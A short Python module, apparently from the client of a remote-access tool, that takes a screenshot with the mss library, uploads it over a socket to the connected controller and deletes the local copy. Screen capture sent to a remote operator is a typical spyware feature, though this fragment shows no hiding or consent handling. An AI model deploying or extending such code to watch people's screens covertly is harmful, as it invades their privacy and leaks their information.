import os
try:
    import mss
except ImportError:
    mss = None
    print("[-] mss library not found. Screenshot functionality will fail. Run: pip install mss")
from .file_transfer import upload_file

def take_screenshot(sock):
    from ..communication import send_data  # Import inside the function to avoid circular import
    if not mss:
        send_data(sock, {"status": "error", "message": "MSS library not available for screenshots."})
        return
    temp_screenshot_file = "temp_client_sc.png"
    try:
        with mss.mss() as sct:
            sct.shot(output=temp_screenshot_file)
        upload_file(sock, temp_screenshot_file)
        os.remove(temp_screenshot_file)
    except Exception as e:
        send_data(sock, {"status": "error", "message": f"Screenshot failed: {str(e)}"})